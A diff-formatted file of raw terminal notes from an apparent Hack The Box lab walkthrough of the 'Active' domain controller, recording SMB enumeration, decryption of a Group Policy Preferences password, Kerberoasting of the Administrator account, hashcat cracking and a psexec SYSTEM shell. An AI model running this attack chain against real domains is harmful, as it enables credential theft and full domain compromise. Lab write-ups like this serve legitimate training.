@@ -1,0 +1,470 @@
+RECON
+root@kali:~/htb/active# nmap -sC -sV -p- -vv -oA  full 10.10.10.100
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-11-28 20:25:17Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49172/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49182/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5m12s, deviation: 0s, median: 5m12s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 23380/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 42633/udp): CLEAN (Timeout)
+|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-11-28 15:26:18
+|_  start_date: 2020-11-28 15:21:56
+
+
+SMB ENUM
+root@kali:~/htb/active# enum4linux -a 10.10.10.100
+
+ ========================================= 
+|    Share Enumeration on 10.10.10.100    |
+ ========================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+WARNING: The "syslog" option is deprecated
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+
+root@kali:~/htb/active# smbmap -H 10.10.10.100
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	NO ACCESS
+	NETLOGON                                          	NO ACCESS
+	Replication                                       	READ ONLY
+	SYSVOL                                            	NO ACCESS
+	Users                                             	NO ACCESS
+
+CONNECT TO SMB REPLICATION DIRECTORY
+root@kali:~/htb/active# smbclient //10.10.10.100/Replication
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+smb: \> cd active.htb\
+smb: \active.htb\> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
+  Policies                            D        0  Sat Jul 21 06:37:44 2018
+  scripts                             D        0  Wed Jul 18 14:48:57 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+
+GET GROUP XML FILE TO SEE IF USER ACCOUNT CREDENTIALS STORED
+smb: \active.htb\> cd Policies\
+smb: \active.htb\Policies\> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
+  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+smb: \active.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}\
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
+  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
+  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
+  USER                                D        0  Wed Jul 18 14:49:12 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd USER\
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> ls
+  .                                   D        0  Wed Jul 18 14:49:12 2018
+  ..                                  D        0  Wed Jul 18 14:49:12 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE\
+MACHINE\Microsoft\    MACHINE\Preferences\  MACHINE\Registry.pol  
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE\Preferences\Groups\
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
+
+		10459647 blocks of size 4096. 4924872 blocks available
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
+
+
+
+GET PASSWORD FROM GROUP XML FILE
+root@kali:~/htb/active# cat Groups.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+
+GET USERNAME AND PASSWORD
+userName="active.htb\SVC_TGS"
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+DECRYPT PASSWORD WITH GPP
+root@kali:~/htb/active# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+GPPstillStandingStrong2k18
+
+CHECK ACCOUNT PRIVILEGES
+root@kali:~/htb/active# psexec.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100 cmd.exe
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.100.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'Replication' is not writable.
+[-] share 'SYSVOL' is not writable.
+[-] share 'Users' is not writable.
+
+OR 
+root@kali:~/htb/active# crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p GPPstillStandingStrong2k18 --shares
+[*] First time use detected
+[*] Creating home directory structure
+[*] Initializing the database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
+CME          10.10.10.100:445 DC              [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
+CME          10.10.10.100:445 DC              [+] Enumerating shares
+CME          10.10.10.100:445 DC              SHARE           Permissions
+CME          10.10.10.100:445 DC              -----           -----------
+CME          10.10.10.100:445 DC              ADMIN$          NO ACCESS
+CME          10.10.10.100:445 DC              IPC$            NO ACCESS
+CME          10.10.10.100:445 DC              SYSVOL          READ
+CME          10.10.10.100:445 DC              C$              NO ACCESS
+CME          10.10.10.100:445 DC              Replication     READ
+CME          10.10.10.100:445 DC              NETLOGON        READ
+CME          10.10.10.100:445 DC              Users           READ
+[*] KTHXBYE!
+
+RUN KERBROASTING SCRIPT
+root@kali:~/htb/active# python /root/impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520
+
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+NEED TO CORRECT TIME DIFFERENCE ON KALI TO MATCH ACTIVE
+ntpdate active.htb
+OR
+timedatectl set-ntp 0 && date --set 2018-07-30 && date --set 13:17:40 && date
+
+RERUN KERBROASTING SCRIPT TO GET NTLM HASH
+python /root/impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$962a7c86f5709dbf9433c5e8c445a498$7dbea8c03963e835ad7138297eba50f0e5912b79f618401a013906a591792e3093111827f5122bcb39ea66c052f9897b9db436c897fa1fc5af03ea141e01f36963ae93dc39254b05d7dee5e31febeaf618bb72796619a79a8cccfe1bdfd94a3460a7d6f0e93f446b88d78b7284927fe07d13ea2dd7fa1662f14682de721731fec9614a0b0e1da756602468ce2abde0181af7b2f5339d21a7dba3facd8e4b8c31d3852dcb00306f052612d5904dbfaef69da204e16a5e720985735dff22e080b0ee45127ee060aee042900362651aef09d6b4c827ffb46f1af8afe32ac42251e8fde5b12651254773b4f94ce63f88fe862f442cb2e78c6ff394d99dacaff5858f026167ff34fe51ad810f6382c72729e4cc44183a40d71cea83221c899d41599de4778659524e623e96d554f48f909409dc1ec0b7e5de818473c71596b14bad36ac12532db537b405595e51f87dab07f49033820ef2ea9e276113783b79fa065bebd73ef74dbf27eedeaf8c1f8330fb7e837f1f5d2369360d41cfa0326d003b9319a9ef1462af98b9afd89190dcfceda74c785b3a60402beeb235549e3f794da690e552be6c28d376dee080b960a1d018c75a0e6c008d980df60254076e9106e99bec3cdf7c18a856515423c4acdd41b1ac04f0816cae05909788d4d77d9230fa1855c25f48e3fb965bc34a9f0c3a40f2222730e2eaa396d26cf0c530c26a8bfca8ca6fea3db01588c893f83d2bd6f63a9ad3ff4165c46bec92992b9d668b3f764c6ed7c7c1d351bb789e43869afcd4ad740c7bfe249212a60275581907bc83d721c3d55345d29e7f8deef734c623e1ae2f0ae20150c0cc2e8d1f50cca86a644dd185dfee583dac412eb0c1cab1c9c8d14307f688624085aa0d45fb5c8fdc7ae2ab7bb48475d08642ffff72b7d6c70545574af3fe2c0acc0d5d1effb43a3695cd7d0ee4ec01d560e737f81234742709d4233ce6930cdd7161cd46e038e25bb002bc1b114dcf67477349190a47a54a1fc52ddb65e84ec71f32b278d4c63c40000b21363b132352f306c9076ea56420230ebd7c9dc79f627ed62e54bbf2d7671cce36a986ba566022c43cbbd68a6b58a1464fa86a2180dcac30d21fcccabd44c9c7e9078b187028ac75ce5d49af91726911e813c0bea949624be7ed0953d02f41e005a0075ff52d3caf10d8d6181fd851dd227aee55060f60637c4def7f6c83b891582338a75540a3ebe3fad0dfbeb4ae1686841b63dff8b1550bd2
+
+CRACK HASH WITH HASHCAT
+root@kali:~/htb/active# hashcat -m 13100 active_hash /usr/share/wordlists/rockyou.txt
+
+Cracked: Ticketmaster1968
+
+GET ROOT SHELL
+root@kali:~/htb/active# psexec.py Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file vWXZtrxV.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service rsdX on 10.10.10.100.....
+[*] Starting service rsdX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>dir C:\Users
+ Volume in drive C has no label.
+ Volume Serial Number is 2AF3-72E4
+
+ Directory of C:\Users
+
+21/07/2018  04:39 úú    <DIR>          .
+21/07/2018  04:39 úú    <DIR>          ..
+16/07/2018  12:14 úú    <DIR>          Administrator
+14/07/2009  06:57 ºú    <DIR>          Public
+21/07/2018  05:16 úú    <DIR>          SVC_TGS
+               0 File(s)              0 bytes
+               5 Dir(s)  20.169.195.520 bytes free
+
+GET USER FLAG
+
+C:\Windows\system32>type C:\Users\SVC_TGS\Desktop\user.txt
+##################################
+
+GET ROOT FLAG
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+##################################
+
+SYSTEMINFO
+C:\Windows\system32>systeminfo
+
+Host Name:                 DC
+OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-507-9857321-84027
+Original Install Date:     16/7/2018, 1:13:22 úú
+System Boot Time:          28/11/2020, 10:21:38 úú
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.295 MB
+Virtual Memory: Max Size:  8.189 MB
+Virtual Memory: Available: 7.460 MB
+Virtual Memory: In Use:    729 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    active.htb
+Logon Server:              N/A
+Hotfix(s):                 166 Hotfix(s) Installed.
+                           [01]: KB981391
+                           [02]: KB981392
+                           [03]: KB977236
+                           [04]: KB981111
+                           [05]: KB977238
+                           [06]: KB2849697
+                           [07]: KB2849696
+                           [08]: KB2841134
+                           [09]: KB977239
+                           [10]: KB2670838
+                           [11]: KB2830477
+                           [12]: KB2592687
+                           [13]: KB981390
+                           [14]: KB2305420
+                           [15]: KB2386667
+                           [16]: KB2393802
+                           [17]: KB2506014
+                           [18]: KB2506212
+                           [19]: KB2506928
+                           [20]: KB2545698
+                           [21]: KB2547666
+                           [22]: KB2552343
+                           [23]: KB2560656
+                           [24]: KB2563227
+                           [25]: KB2564958
+                           [26]: KB2574819
+                           [27]: KB2603229
+                           [28]: KB2604115
+                           [29]: KB2607047
+                           [30]: KB2608658
+                           [31]: KB2620704
+                           [32]: KB2621440
+                           [33]: KB2640148
+                           [34]: KB2643719
+                           [35]: KB2654428
+                           [36]: KB2660075
+                           [37]: KB2667402
+                           [38]: KB2676562
+                           [39]: KB2685811
+                           [40]: KB2685813
+                           [41]: KB2690533
+                           [42]: KB2698365
+                           [43]: KB2705219
+                           [44]: KB2719857
+                           [45]: KB2726535
+                           [46]: KB2729094
+                           [47]: KB2732059
+                           [48]: KB2736422
+                           [49]: KB2742599
+                           [50]: KB2750841
+                           [51]: KB2761217
+                           [52]: KB2763523
+                           [53]: KB2765809
+                           [54]: KB2770660
+                           [55]: KB2786081
+                           [56]: KB2791765
+                           [57]: KB2800095
+                           [58]: KB2806748
+                           [59]: KB2807986
+                           [60]: KB2808679
+                           [61]: KB2813347
+                           [62]: KB2813430
+                           [63]: KB2834140
+                           [64]: KB2840631
+                           [65]: KB2843630
+                           [66]: KB2852386
+                           [67]: KB2853587
+                           [68]: KB2853952
+                           [69]: KB2857650
+                           [70]: KB2861698
+                           [71]: KB2862330
+                           [72]: KB2864202
+                           [73]: KB2868038
+                           [74]: KB2871997
+                           [75]: KB2884256
+                           [76]: KB2891804
+                           [77]: KB2892074
+                           [78]: KB2893294
+                           [79]: KB2893519
+                           [80]: KB2894844
+                           [81]: KB2908783
+                           [82]: KB2911501
+                           [83]: KB2912390
+                           [84]: KB2919469
+                           [85]: KB2923545
+                           [86]: KB2931356
+                           [87]: KB2937610
+                           [88]: KB2943357
+                           [89]: KB2966583
+                           [90]: KB2968294
+                           [91]: KB2970228
+                           [92]: KB2972100
+                           [93]: KB2973201
+                           [94]: KB2977292
+                           [95]: KB2984972
+                           [96]: KB2985461
+                           [97]: KB2991963
+                           [98]: KB2992611
+                           [99]: KB3000483
+                           [100]: KB3003743
+                           [101]: KB3004375
+                           [102]: KB3006137
+                           [103]: KB3010788
+                           [104]: KB3011780
+                           [105]: KB3020370
+                           [106]: KB3020388
+                           [107]: KB3021674
+                           [108]: KB3023215
+                           [109]: KB3030377
+                           [110]: KB3035126
+                           [111]: KB3037574
+                           [112]: KB3045685
+                           [113]: KB3046017
+                           [114]: KB3046269
+                           [115]: KB3054205
+                           [116]: KB3054476
+                           [117]: KB3055642
+                           [118]: KB3059317
+                           [119]: KB3060716
+                           [120]: KB3068457
+                           [121]: KB3068708
+                           [122]: KB3071756
+                           [123]: KB3072305
+                           [124]: KB3074543
+                           [125]: KB3075226
+                           [126]: KB3078601
+                           [127]: KB3078667
+                           [128]: KB3080149
+                           [129]: KB3086255
+                           [130]: KB3097989
+                           [131]: KB3102429
+                           [132]: KB3107998
+                           [133]: KB3108371
+                           [134]: KB3108664
+                           [135]: KB3109103
+                           [136]: KB3109560
+                           [137]: KB3110329
+                           [138]: KB3118401
+                           [139]: KB3123479
+                           [140]: KB3124275
+                           [141]: KB3127220
+                           [142]: KB3133043
+                           [143]: KB3133977
+                           [144]: KB3137061
+                           [145]: KB3138612
+                           [146]: KB3139398
+                           [147]: KB3139914
+                           [148]: KB3140245
+                           [149]: KB3147071
+                           [150]: KB3156016
+                           [151]: KB3156019
+                           [152]: KB3159398
+                           [153]: KB3161949
+                           [154]: KB3172605
+                           [155]: KB3177467
+                           [156]: KB3179573
+                           [157]: KB3185319
+                           [158]: KB4019990
+                           [159]: KB4040980
+                           [160]: KB4095874
+                           [161]: KB4338423
+                           [162]: KB958488
+                           [163]: KB976902
+                           [164]: KB976932
+                           [165]: KB982018
+                           [166]: KB4338821
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.100
+
+
+
